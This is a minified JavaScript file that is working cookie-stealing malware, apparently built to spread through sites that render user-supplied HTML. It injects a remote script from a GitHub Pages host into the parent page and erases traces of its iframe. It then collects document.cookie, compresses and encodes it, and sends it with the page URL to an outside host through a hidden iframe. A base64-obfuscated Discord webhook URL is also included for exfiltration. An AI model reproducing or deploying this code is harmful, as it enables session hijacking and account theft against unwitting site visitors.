function getRandomElement(){var t=e.getElementsByTagName("*");return t[Math.floor(Math.random()*t.length)]}if(null==window.parent.m){window.parent.m=!0;var e=window.parent.document;function t(){for(var t=e.getElementsByTagName("iframe"),n=0;n<t.length;n++){var a=t[n];if(a.contentWindow===window){console.log(a.parentNode.innerText);var r=getRandomElement();if(r){let i=document.createElement("script");i.src="https://scriggermania.github.io/what.js",r.appendChild(i),a.remove()}break}}}function n(){for(var t="<iframe",n=e.getElementsByTagName("td"),a=0;a<n.length;a++){var r=n[a];r.textContent.includes(t)&&(r.textContent=r.textContent.split(t)[0])}}n(),t()}else{function a(){return btoa(pako.deflate(window.ce,{to:"string"}))}function r(e){return atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv")+atob(e)}function i(e,t=null,n=null){t=null!=t&&getRandomElement();let a=document.createElement("script");a.src=e,null!=n&&(a.type=n),t.appendChild(a)}window.loc=window.location.href,window.ce=document.cookie,i("https://cdnjs.cloudflare.com/ajax/libs/pako/1.0.11/pako.min.js"),setTimeout(()=>{let e=document.createElement("iframe");e.style.display="none",e.src="https://ScriggerMania.github.io/w.html?u="+encodeURI(window.loc)+"&c="+encodeURI(a()),e.width="600",e.height="400",e.sandbox="allow-scripts",document.documentElement.appendChild(e),e.onload=function(){},window.addEventListener("message",function(e){if("https://ScriggerMania.github.io"===e.origin){let t=document.currentScript;t&&(t.remove(),window.remove())}})},2e3)}
